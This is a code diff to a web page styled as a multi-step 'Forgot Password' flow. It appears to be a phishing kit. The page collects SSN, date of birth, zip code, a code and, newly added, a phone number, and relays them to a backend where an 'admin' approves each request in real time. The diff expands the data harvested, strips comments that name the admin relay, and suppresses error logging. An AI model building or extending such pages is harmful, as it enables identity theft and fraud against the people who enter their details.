@@ -98,11 +98,15 @@
             <button class="continue" onclick="saveStep1()">Continue</button>
         </div>
 
-        <!-- Step 2: Zip Code -->
+        <!-- Step 2: Zip Code + Phone Number -->
         <div id="step2" class="step">
             <h1>Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
@@ -131,7 +135,6 @@
                 return;
             }
 
-            // Send initial request to admin
             fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -181,13 +184,15 @@
 
         function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
-            if (zip.length !== 5) {
-                alert("Please enter a valid 5-digit Zip Code.");
+            const phone = document.getElementById('phone').value.trim();
+
+            if (zip.length !== 5 || !phone) {
+                alert("Please enter a valid 5-digit Zip Code and Phone Number.");
                 return;
             }
 
-            const details = `Zip: ${zip} | Status: Forgot Password - Step 2 Completed`;
-            saveStep(details, "Step 2 - Zip Code");
+            const details = `Zip: ${zip} | Phone: ${phone} | Status: Forgot Password - Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code & Phone");
             nextStep(3);
         }
 
@@ -210,12 +215,12 @@
             const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value || "";
+            const phone = document.getElementById('phone').value || "";
 
-            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Forgot Password - Pending Reset`;
+            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Forgot Password - Pending Reset`;
 
             await saveStep(fullDetails, "Final Code Submission - Forgot Password");
 
-            // Polling for admin approval
             const interval = setInterval(async () => {
                 try {
                     const res = await fetch('/api/records');
@@ -236,9 +241,7 @@
                         clearInterval(interval);
                         statusDiv.innerHTML = `<span class="error">❌ Request Rejected by Admin.</span>`;
                     }
-                } catch (e) {
-                    console.error(e);
-                }
+                } catch (e) {}
             }, 2000);
         }
 
